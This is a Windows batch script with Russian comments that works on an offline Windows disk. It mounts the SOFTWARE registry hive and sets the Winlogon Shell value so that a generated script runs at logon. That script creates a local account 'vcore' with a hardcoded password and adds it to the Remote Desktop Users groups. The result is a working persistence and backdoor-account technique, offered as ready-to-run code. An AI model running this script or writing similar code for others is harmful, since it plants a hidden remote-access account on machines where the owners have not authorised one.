@echo off
chcp 1251 >nul
:: =========================================
:: BAT-скрипт: модификация Winlogon Shell и RDP в оффлайн SOFTWARE
:: Автоматическое определение диска с Windows
:: =========================================
:: Требуется запуск от администратора

:: ==========================
:: 1. Определяем диск с Windows
SET "OFFLINE_DISK="
IF EXIST "C:\Windows\System32\config\SOFTWARE" SET "OFFLINE_DISK=C:"
IF EXIST "D:\Windows\System32\config\SOFTWARE" SET "OFFLINE_DISK=D:"
IF EXIST "E:\Windows\System32\config\SOFTWARE" SET "OFFLINE_DISK=E:"

:: Проверка
IF "%OFFLINE_DISK%"=="" (
    echo Не удалось определить диск с Windows. Укажите вручную в скрипте.
    pause
    exit /b
)

echo Используем диск: %OFFLINE_DISK%

:: ==========================
:: 2. Путь к оффлайн SOFTWARE
SET "OFFLINE_SOFTWARE=%OFFLINE_DISK%\Windows\System32\config\SOFTWARE"

:: Временная ветка реестра для монтирования
SET "REG_BRANCH=HKLM\OfflineSystem"

:: Путь к вашему скрипту
SET "MY_SCRIPT=%OFFLINE_DISK%\Windows\Temp\user_create.bat"

:: ==========================
:: 3. Создаем скрипт (добавлено добавление в группы RDP)
:: Перезаписываем файл, чтобы обновить содержимое
echo @echo off > "%MY_SCRIPT%"
echo chcp 1251 ^>nul >> "%MY_SCRIPT%"
echo timeout /t 3 /nobreak ^>nul >> "%MY_SCRIPT%"
echo net user vcore 639639 /add >> "%MY_SCRIPT%"
echo net localgroup Users vcore /add >> "%MY_SCRIPT%"
:: Добавление в RDP-группы для русской и английской Windows
echo net localgroup "Пользователи удаленного рабочего стола" vcore /add >> "%MY_SCRIPT%"
echo net localgroup "Remote Desktop Users" vcore /add >> "%MY_SCRIPT%"
echo echo Пользователь vcore создан и добавлен в RDP в %%date%% %%time%% >> "%MY_SCRIPT%"

:: ==========================
:: 4. Монтируем оффлайн SOFTWARE
echo Монтируем оффлайн SOFTWARE...
REG LOAD %REG_BRANCH% "%OFFLINE_SOFTWARE%"
IF %ERRORLEVEL% NEQ 0 (
    echo Ошибка при монтировании оффлайн SOFTWARE. Проверьте путь и права администратора.
    pause
    exit /b
)

:: ==========================
:: 5. Изменяем Winlogon Shell
echo Изменяем Winlogon Shell...
REG ADD "%REG_BRANCH%\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Shell" /D "explorer.exe,%MY_SCRIPT%" /F
IF %ERRORLEVEL% NEQ 0 (
    echo Ошибка при изменении Shell.
    REG UNLOAD %REG_BRANCH%
    pause
    exit /b
)


:: ==========================
:: 6. Выгружаем временную ветку
echo Выгружаем временную ветку...
REG UNLOAD %REG_BRANCH%
IF %ERRORLEVEL% NEQ 0 (
    echo Ошибка при выгрузке ветки.
    pause
    exit /b
)

echo Операция завершена успешно!
pause
